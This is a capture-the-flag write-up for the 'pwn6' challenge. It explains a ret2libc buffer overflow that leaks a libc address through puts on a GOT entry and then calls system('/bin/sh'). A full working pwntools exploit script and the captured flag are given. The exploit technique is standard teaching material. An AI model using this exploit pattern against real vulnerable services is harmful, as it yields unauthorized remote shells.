# pwn / pwn6

> Points: 3409

## Question

```
nc uwctf.ml 6007
```

## Solution

This is the final boss of the pwn challenges, the only difference from the last challenge is that we no longer have the `"/bin/sh"` string, so we'll have to get it from somewhere ourselves.

Even though the program itself no longer has the `"/bin/sh"` string, the program is still linked with libc which *does* have the same `"/bin/sh"` string stored somewhere within its memory.  
The only problem is that libc is affected by ASLR (Address Space Layout Randomization) meaning it's loaded at a different address every time and we don't know what that address is.  
If we can somehow get the address of a function in libc and we know the relative offset between that function and where `"/bin/sh"` is stored we should be able to get the address of `"/bin/sh"` as well.

For this we first need to get the exact version of libc being used so we can find the relative offset of `"/bin/sh"`.  
This is done by calling `puts` on a few entries in the GOT (Global Offset Table), the GOT is a table that stores pointers to functions in external libraries (like libc), the table is filled in at runtime after the random address of libc has already been decided.  
Then we can use an online tool like https://libc.blukat.me/ or https://libc.rip/ to find the libc version where all the addresses of the functions line up, for this challenge it turns out we're using `libc6_2.27-3ubuntu1.6_i386.so`.

Now in order to send the `"/bin/sh"` pointer with a correct offset we need to get the address of libc and then call system in the *same process*, because otherwise ASLR might've changed the address.  
This can be done by first calling `puts` on a GOT entry and setting the return address of `puts` to return back to `hack_me` so it will ask for input again and then we can call `system` on `"/bin/sh"` once we have leaked the address of libc.

The final exploit:
```python
from pwn import *

exe = ELF("chall6.bin")
lib = ELF("libc6_2.27-3ubuntu1.6_i386.so")
p = remote("uwctf.ml", 6007)
p.clean_and_log(timeout=0.5)
p.send(B"A" * 28 + p32(exe.sym["puts"]) + p32(exe.sym["hack_me"]) + p32(exe.got["puts"]) + b"\n")
lib.address = u32(p.recv(4)) - lib.sym["puts"]
p.clean_and_log(timeout=0.5)
p.send(B"A" * 28 + p32(lib.sym["system"]) + b"AAAA" + p32(next(lib.search(b"/bin/sh"))) + b"\n")
p.interactive()
```

### Flag

`uwctf{buff3r0v3rf10w6_888537505c6dc7a5}`
